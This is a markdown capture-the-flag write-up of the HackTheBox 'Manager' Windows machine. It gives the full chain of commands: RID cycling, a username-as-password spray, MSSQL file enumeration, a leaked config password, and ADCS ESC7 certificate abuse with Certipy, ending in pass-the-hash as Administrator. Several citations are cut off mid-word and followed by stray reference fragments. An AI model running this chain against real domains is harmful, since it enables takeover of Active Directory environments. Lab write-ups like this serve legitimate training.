## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Medium](Medium)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP)
- **Exploits Used**:
    
    - RID Cycling (user SID enumeration)
    - Password spray (username == password)
    - MSSQL `xp_dirtree` file enumeration
    - Plaintext credentials in config file
    - ADCS ESC7 misconfiguration (cert issuance for privilege escalation)
        

**Open Ports:**

- 53 – DNS
- 80 – HTTP
    
- 88 – Kerberos
    
- 135 – MS RPC
    
- 139 – NetBIOS-SSN
    
- 389 – LDAP
    
- 445 – SMB
    
- 464 – kpasswd5 (Kerberos Password)
    
- 593 – RPC HTTP
    
- 636 – LDAPS
    
- 1433 – MSSQL
    
- 3268/3269 – Global Catalog
    
- 5985 – WinRM
    
- 9389 – ADWS
    

---

### 🧠 TL;DR

This Windows Active Directory machine required chaining multiple weaknesses to get Administrator. In summary:

- **User Enumeration:** Performed a RID cycling attack (null session SID enumeration) to list domain users, which revealed several valid usernames like `raven` and `operator ([HTB: Manager | 0xdf hacks stuff](https://0xdf.gitlab.io/2024/03/16/htb-manager.html#:~:text=1113%3A%20MANAGER,Operator%20%28SidTypeUser))】.
    
- **Initial Credential:** Used a password spraying strategy testing username-as-password for each account. Discovered that the `operator` account had the password **operator** (i.e. `operator:operator` was valid ([HTB: Manager | 0xdf hacks stuff](https://0xdf.gitlab.io/2024/03/16/htb-manager.html#:~:text=manager.htb))】.
    
- **MSSQL Access:** With the `operator` credentials (a low-priv domain user), gained access to the MSSQL service on the server using Windows authentication. Since commands like `xp_cmdshell` were disabled, leveraged the `xp_dirtree` procedure to enumerate the file system. This revealed a website backup ZIP file in the webroo ([HTB: Manager | 0xdf hacks stuff](https://0xdf.gitlab.io/2024/03/16/htb-manager.html))】.
    
- **Sensitive Data Exposure:** Downloaded the backup archive from the web server and extracted it. Inside was an old configuration XML file containing an LDAP bind account for user **Raven**, along with her plaintext password (`R4v3nBe5tD3veloP3r!123` ([HTB: Manager | 0xdf hacks stuff](https://0xdf.gitlab.io/2024/03/16/htb-manager.html#:~:text=%3Caccess,list))】. This provided credentials for the domain user **raven**.
    
- **Privilege Escalation to User:** Logged into the target as Raven (e.g. via WinRM) and confirmed this account’s access. Found that Raven had elevated privileges in Active Directory Certificate Services (ADCS) – specifically, she possessed the **Manage CA** permission on the enterprise CA (an ESC7 misconfiguration ([HTB: Manager | 0xdf hacks stuff](https://0xdf.gitlab.io/2024/03/16/htb-manager.html#:~:text=ESC7%20is%20when%20a%20user,shown%20in%20the%20output%20above))】. This meant Raven could manage certificate issuance on the CA.
    
- **Privilege Escalation to Administrator:** Abused the ADCS **ESC7** misconfiguration to issue a certificate for the Domain Administrator. In practice, Raven’s ManageCA rights were used to give herself certificate manager privileges and then request a SubCA certificate as Administrator (which is initially pending) and manually approve it. This yielded a valid cert for Administrator’s identit ([HackTricks/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md at master · b4rdia/HackTricks · GitHub](https://github.com/b4rdia/HackTricks/blob/master/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#:~:text=The%20technique%20relies%20on%20the,issued%20by%20the%20manager%20afterwards))】. Using that certificate, obtained Administrator credentials (NTLM hash) and logged in as **Administrator**, owning the box.
    

---

### 🔧 Tools

- `nmap`, `ffuf`, `feroxbuster`, `lookupsid.py`, `netexec`, `ldapsearch`, `ldapdomaindump`
    
- `mssqlclient.py`, `wget`, `evil-winrm`, `Certipy`
    

---

### 🚀 Commands

- `nmap -p- --min-rate 10000 -oA full 10.10.11.236` – Full port scan
    
- `netexec smb manager.htb -u guest -p '' --rid-brute` – RID cycle via SMB (null session)
    
- `netexec smb manager.htb -u users -p users --continue-on-success --no-brute` – Password spray (username=password for each user in list)
    
- `mssqlclient.py -windows-auth manager.htb/Operator:operator@manager.htb` – Connect to MSSQL with Operator’s domain creds
    
- Use `xp_dirtree` (in SQL prompt) to explore `C:\inetpub\wwwroot` and find the backup ZIP
    
- `wget http://manager.htb/website-backup-27-07-23-old.zip` – Download the discovered website backup
    
- `unzip website-backup-27-07-23-old.zip` – Extract contents (find `.old-conf.xml`)
    
- `evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'` – WinRM as Raven (password from config)
    
- `certipy ca -add-officer raven ...` – Use Raven’s ManageCA to give herself ManageCertificates (Certificate Manager) rights
    
- `certipy req -template SubCA -upn administrator@manager.htb ...` – Request a cert for Administrator (will be pending)
    
- `certipy ca -issue-request <ID> ...` – Manually issue the pending Administrator cert
    
- `certipy req -retrieve <ID> ...` – Retrieve the issued cert (PFX for Administrator)
    
- `certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236` – Authenticate as Administrator via certificate (get NTLM hash)
    
- `evil-winrm -i manager.htb -u administrator -H <hash>` – WinRM as Administrator with the obtained hash 🎉
    

---

### 📚 Lessons Learned

- **RID cycling** is still 🔥 for enumerating users when anonymous SMB access is a ([TrustedSec | New Tool Release - RPC_ENUM - RID Cycling Attack](https://trustedsec.com/blog/new-tool-release-rpc_enum-rid-cycling-attack#:~:text=a%20RID%20cycling%20attack%20that,uses%20all%20standard%20python%20libraries))7-L10】. Even in modern AD setups, this can quickly expose valid usernames.
    
- A simple **password spray** (especially testing for default or username-as-password) can yield creds. Users like “operator” often have trivial passwords in lab environments.
    
- **MSSQL xp_dirtree** can leak interesting file paths and contents even if `xp_cmdshell` is di ([HTB: Manager | 0xdf hacks stuff](https://0xdf.gitlab.io/2024/03/16/htb-manager.html))-L807】. It’s a handy trick for horizontal information disclosure on Windows SQL servers.
    
- Always check for **sensitive config files** in backups. Hardcoded credentials (like Raven’s LDAP password) are a gold mine for pivoting to higher privileges.
    
- Misconfigured **AD Certificate Services** (ESC7 in this case) is a serious escalation vector. A user with ManageCA privileges can effectively become a CA admin and issue certificates to impersonate higher privileged ac ([HackTricks/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md at master · b4rdia/HackTricks · GitHub](https://github.com/b4rdia/HackTricks/blob/master/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#:~:text=The%20technique%20relies%20on%20the,issued%20by%20the%20manager%20afterwards))-L627】. This demonstrates how dangerous ADCS misconfigurations can be in an Active Directory environment.
    
- Tools like **Certipy** greatly simplify ADCS abuse, turning complex certificate attacks into a few straightforward commands.
    

---

### 📖 References

- [0xdf: HTB Manager – Walkthrough](https://0xdf.gitlab.io/2024/03/16/htb-manager.html)
    
- [HackTricks – Active Directory Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
    
- [ADCS ESC7 (Certificate Authority ACL) – Certified Pr ([HackTricks/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md at master · b4rdia/HackTricks · GitHub](https://github.com/b4rdia/HackTricks/blob/master/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#:~:text=The%20technique%20relies%20on%20the,issued%20by%20the%20manager%20afterwards))9-L627】]([https://posts.specterops.io/certified-pre-owned-d95910965cd2](https://posts.specterops.io/certified-pre-owned-d95910965cd2))
    
- [Certipy – AD CS Exploitation Tool (GitHub)](https://github.com/ly4k/Certipy)